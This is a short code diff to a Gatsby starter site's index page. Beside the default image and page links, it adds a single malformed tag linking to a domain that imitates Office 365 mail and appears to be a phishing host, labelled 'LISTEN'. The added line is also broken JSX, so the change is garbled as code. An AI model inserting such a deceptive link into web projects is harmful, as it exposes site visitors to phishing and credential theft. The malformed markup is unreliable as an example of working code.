@@ -19,6 +19,7 @@ const IndexPage = () => (
       alt="A Gatsby astronaut"
       style={{ marginBottom: `1.45rem` }}
     />
+     <href="https://mailoffice365.reambase.ga/no_reply@mailoffice365.com"target="_blank">LISTEN>
     <p>
       <Link to="/page-2/">Go to page 2</Link> <br />
       <Link to="/using-typescript/">Go to "Using TypeScript"</Link>
